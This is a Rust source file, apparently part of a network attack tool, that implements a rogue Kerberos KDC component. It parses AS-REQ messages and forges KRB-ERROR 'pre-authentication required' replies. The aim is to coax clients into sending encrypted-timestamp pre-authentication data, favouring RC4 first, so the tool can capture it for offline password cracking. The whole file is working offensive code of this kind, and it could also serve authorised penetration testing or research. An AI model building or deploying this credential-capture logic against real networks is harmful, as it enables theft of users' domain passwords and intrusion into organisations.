//! Minimal Kerberos (KRB5) ASN.1/DER support for the rogue KDC: recognise AS-REQ, extract the
//! realm/principal/etypes, and build a `KRB-ERROR` (`KDC_ERR_PREAUTH_REQUIRED` / `_NOSUPP`) to
//! elicit and then capture pre-authentication material.

use crate::protocols::ber::encode_len;

// Kerberos message application tags.
pub const APP_AS_REQ: u8 = 10;
pub const APP_AS_REP: u8 = 11;
pub const APP_TGS_REQ: u8 = 12;
pub const APP_TGS_REP: u8 = 13;
pub const APP_AP_REQ: u8 = 14;
pub const APP_ERROR: u8 = 30;

pub const KDC_ERR_ETYPE_NOSUPP: i64 = 14;
pub const KDC_ERR_PREAUTH_REQUIRED: i64 = 25;

fn tlv(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend_from_slice(&encode_len(content.len()));
    out.extend_from_slice(content);
    out
}

/// Minimal two's-complement INTEGER content bytes.
fn int_bytes(v: i64) -> Vec<u8> {
    let bytes = v.to_be_bytes();
    let mut start = 0;
    while start < 7 {
        let b = bytes[start];
        let next = bytes[start + 1];
        if (b == 0x00 && next & 0x80 == 0) || (b == 0xff && next & 0x80 != 0) {
            start += 1;
        } else {
            break;
        }
    }
    bytes[start..].to_vec()
}

fn gen_string(s: &str) -> Vec<u8> {
    tlv(0x1b, s.as_bytes())
}

fn octet_string(b: &[u8]) -> Vec<u8> {
    tlv(0x04, b)
}

fn seq(parts: &[Vec<u8>]) -> Vec<u8> {
    let mut content = Vec::new();
    for p in parts {
        content.extend_from_slice(p);
    }
    tlv(0x30, &content)
}

fn ctx_prim(n: u8, content: &[u8]) -> Vec<u8> {
    tlv(0x80 | n, content)
}

fn ctx_cons(n: u8, parts: &[Vec<u8>]) -> Vec<u8> {
    let mut content = Vec::new();
    for p in parts {
        content.extend_from_slice(p);
    }
    tlv(0xa0 | n, &content)
}

fn app(n: u8, parts: &[Vec<u8>]) -> Vec<u8> {
    let mut content = Vec::new();
    for p in parts {
        content.extend_from_slice(p);
    }
    tlv(0x60 | n, &content)
}

/// Iterate the top-level TLVs of a DER-encoded buffer.
pub fn children(buf: &[u8]) -> Vec<(u8, &[u8])> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < buf.len() {
        let tag = buf[i];
        if i + 1 >= buf.len() {
            break;
        }
        let first = buf[i + 1];
        let (len, hdr) = if first & 0x80 == 0 {
            (first as usize, 2usize)
        } else {
            let n = (first & 0x7f) as usize;
            if n == 0 || i + 2 + n > buf.len() {
                break;
            }
            let mut l = 0usize;
            for k in 0..n {
                l = (l << 8) | buf[i + 2 + k] as usize;
            }
            (l, 2 + n)
        };
        let start = i + hdr;
        let end = start + len;
        if end > buf.len() {
            break;
        }
        out.push((tag, &buf[start..end]));
        i = end;
    }
    out
}

fn int_from(bytes: &[u8]) -> i32 {
    let mut v: i32 = 0;
    for &b in bytes {
        v = (v << 8) | b as i32;
    }
    v
}

/// The Kerberos message application tag, if `buf` is a Kerberos message.
pub fn message_type(buf: &[u8]) -> Option<u8> {
    let t = *buf.first()?;
    if t & 0xc0 == 0x40 && t & 0x20 != 0 {
        Some(t & 0x1f)
    } else {
        None
    }
}

/// Best-effort parse of an AS-REQ.
#[derive(Clone, Debug, Default)]
pub struct AsReq {
    pub realm: Option<String>,
    pub cname: Option<String>,
    pub etypes: Vec<i32>,
    /// Raw pre-authentication encrypted timestamp (`PA-ENC-TIMESTAMP` value), when supplied.
    pub preauth: Option<Vec<u8>>,
    pub preauth_etype: Option<i32>,
}

pub fn parse_as_req(buf: &[u8]) -> AsReq {
    let mut req = AsReq::default();
    let top = children(buf);
    for (tag, content) in &top {
        match tag {
            0xa3 => parse_padata(content, &mut req),
            0xa4 => parse_body(content, &mut req),
            _ => {}
        }
    }
    req
}

fn parse_padata(content: &[u8], req: &mut AsReq) {
    for (_t, pa) in children(content) {
        let mut pa_type: i32 = -1;
        let mut pa_value: Option<&[u8]> = None;
        for (pt, pv) in children(pa) {
            match pt {
                0x81 => pa_type = int_from(pv),
                0x82 => pa_value = Some(pv),
                _ => {}
            }
        }
        if pa_type == 2 {
            // PA-ENC-TIMESTAMP: padata-value is an OCTET STRING wrapping EncryptedData.
            if let Some(inner) = pa_value.and_then(|v| children(v).first().map(|c| c.1)) {
                for (et, ev) in children(inner) {
                    if et == 0xa0 {
                        req.preauth_etype = Some(int_from(ev));
                    }
                }
            }
            req.preauth = pa_value.map(|v| v.to_vec());
        }
    }
}

fn parse_body(content: &[u8], req: &mut AsReq) {
    for (bt, bv) in children(content) {
        match bt {
            0x82 => req.realm = Some(String::from_utf8_lossy(bv).to_string()),
            0xa1 => {
                for (nt, nv) in children(bv) {
                    if nt == 0xa1
                        && let Some((_s, s)) = children(nv).first().copied()
                    {
                        req.cname = Some(String::from_utf8_lossy(s).to_string());
                    }
                }
            }
            0xa7 => {
                for (_et, ev) in children(bv) {
                    req.etypes.push(int_from(ev));
                }
            }
            _ => {}
        }
    }
}

/// Build a `KRB-ERROR`. When `include_etype_info` is set, `e-data` carries a `METHOD-DATA`
/// with `PA-ETYPE-INFO2` entries so clients proceed to send pre-authentication.
pub fn build_error(
    error_code: i64,
    realm: &str,
    cname: &str,
    sname_service: &str,
    include_etype_info: bool,
) -> Vec<u8> {
    let mut parts = vec![
        ctx_prim(0, &int_bytes(5)),          // pvno [0]
        ctx_prim(1, &int_bytes(30)),         // msg-type [1]
        ctx_prim(6, &int_bytes(error_code)), // error-code [6]
        ctx_cons(
            8,
            &[
                ctx_prim(0, &int_bytes(1)),
                ctx_cons(1, &[gen_string(cname)]),
            ],
        ), // cname [8]
        tlv(0x89, realm.as_bytes()),         // realm [9]
        ctx_cons(
            10,
            &[
                ctx_prim(0, &int_bytes(2)),
                ctx_cons(
                    1,
                    &[
                        gen_string("krbtgt"),
                        gen_string(realm),
                        gen_string(sname_service),
                    ],
                ),
            ],
        ), // sname [10]
        tlv(0x8b, b"Pre-authentication required"), // e-text [11]
    ];
    if include_etype_info {
        parts.push(tlv(0x8c, &build_method_data(realm))); // e-data [12]
    }
    app(APP_ERROR, &parts)
}

fn build_method_data(realm: &str) -> Vec<u8> {
    let mut entries = Vec::new();
    for etype in [23i64, 18, 17] {
        let mut entry = vec![ctx_prim(0, &int_bytes(etype))];
        if etype != 23 {
            entry.push(tlv(0x81, realm.to_ascii_uppercase().as_bytes())); // salt
        }
        entries.push(seq(&entry));
    }
    let etype_info2 = seq(&entries);
    let pa = seq(&[ctx_prim(1, &int_bytes(19)), octet_string(&etype_info2)]);
    seq(&[pa])
}
